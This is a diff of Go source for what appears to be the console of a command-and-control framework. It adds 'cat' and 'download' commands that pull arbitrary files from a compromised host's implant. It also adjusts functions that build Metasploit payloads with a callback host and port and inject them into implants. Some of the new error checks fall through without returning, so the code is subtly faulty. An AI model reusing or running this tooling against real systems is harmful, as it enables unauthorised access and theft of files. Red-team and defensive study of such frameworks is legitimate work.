@@ -76,6 +76,7 @@ var (
 		"ls":       lsCmd,
 		"cd":       cdCmd,
 		"pwd":      pwdCmd,
+		"cat":      catCmd,
 		"download": downloadCmd,
 		"upload":   uploadCmd,
 	}
@@ -114,7 +115,7 @@ func startConsole(events chan Event) {
 			if cmd, ok := cmdHandlers[words[0]]; ok {
 				cmd.(func(*terminal.Terminal, []string))(term, words[1:])
 			} else {
-				fmt.Fprintf(term, Warn+"Invalid command '%s'\n", words[0])
+				fmt.Fprintf(term, "\n"+Warn+"Invalid command '%s'\n", words[0])
 			}
 			done <- true
 		case event := <-events:
@@ -437,15 +438,14 @@ func msfCmd(term *terminal.Terminal, args []string) {
 		*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
 	config := msf.VenomConfig{
 		Os:         activeSliver.Os,
-		Arch:       msf.MsfArch(activeSliver.Arch),
+		Arch:       msf.Arch(activeSliver.Arch),
 		Payload:    *payloadName,
 		LHost:      *lhost,
 		LPort:      uint16(*lport),
 		Encoder:    "",
-		Iterations: 0, // TODO: Add support for msf encoders/encrypters
-		Encrypt:    "",
+		Iterations: 0, // TODO: Add support for msf encoders
 	}
-	rawPayload, err := msf.MsfVenomPayload(config)
+	rawPayload, err := msf.VenomPayload(config)
 	if err != nil {
 		fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
 		return
@@ -490,15 +490,14 @@ func injectCmd(term *terminal.Terminal, args []string) {
 		*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
 	config := msf.VenomConfig{
 		Os:         activeSliver.Os,
-		Arch:       msf.MsfArch(activeSliver.Arch),
+		Arch:       msf.Arch(activeSliver.Arch),
 		Payload:    *payloadName,
 		LHost:      *lhost,
 		LPort:      uint16(*lport),
 		Encoder:    "",
 		Iterations: 0, // TODO: Add support for msf encoders/encrypters
-		Encrypt:    "",
 	}
-	rawPayload, err := msf.MsfVenomPayload(config)
+	rawPayload, err := msf.VenomPayload(config)
 	if err != nil {
 		fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
 		return
@@ -752,6 +751,30 @@ func pwdCmd(term *terminal.Terminal, args []string) {
 
 }
 
+func catCmd(term *terminal.Terminal, args []string) {
+	catFlags := flag.NewFlagSet("cat", flag.ContinueOnError)
+	catFlags.Usage = func() { helpCmd(term, []string{"cat"}) }
+	err := catFlags.Parse(args)
+	args = catFlags.Args()
+	if err == flag.ErrHelp {
+		return
+	}
+
+	if activeSliver == nil {
+		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		return
+	}
+
+	if len(args) < 1 {
+		fmt.Fprintf(term, "\n"+Warn+"Missing path parameter")
+	}
+	data, err := activeSliverDownload(args[0])
+	if err != nil {
+		fmt.Fprintf(term, "\n"+Warn+"Error: %v", err)
+	}
+	fmt.Fprintln(term, string(data))
+}
+
 func downloadCmd(term *terminal.Terminal, args []string) {
 	downloadFlags := flag.NewFlagSet("download", flag.ContinueOnError)
 	downloadFlags.Usage = func() { helpCmd(term, []string{"download"}) }
@@ -766,6 +789,44 @@ func downloadCmd(term *terminal.Terminal, args []string) {
 		return
 	}
 
+	if len(args) < 2 {
+		fmt.Fprintf(term, "\n"+Warn+"Missing parameter")
+	}
+	data, err := activeSliverDownload(args[0])
+	if err != nil {
+		fmt.Fprintf(term, "\n"+Warn+"Error: %v", err)
+	}
+
+	f, err := os.Create(args[1])
+	if err != nil {
+		fmt.Fprintf(term, "\n"+Warn+"File write failture %s", err)
+	}
+	defer f.Close()
+	f.Write(data)
+}
+
+func activeSliverDownload(filePath string) ([]byte, error) {
+	reqId := randomId()
+	data, _ := proto.Marshal(&pb.DownloadReq{
+		Id:   reqId,
+		Path: filePath,
+	})
+	envelope, err := activeSliverRequest("downloadReq", reqId, data)
+	if err != nil {
+		return []byte{}, err
+	}
+	download := &pb.Download{}
+	err = proto.Unmarshal(envelope.Data, download)
+	if err != nil {
+		return []byte{}, err
+	}
+	if !download.Exists {
+		return []byte{}, fmt.Errorf("Remote file does not exist '%s'", download.Path)
+	}
+	if download.Encoder == "gzip" {
+		return gzipRead(download.Data)
+	}
+	return download.Data, nil
 }
 
 func uploadCmd(term *terminal.Terminal, args []string) {
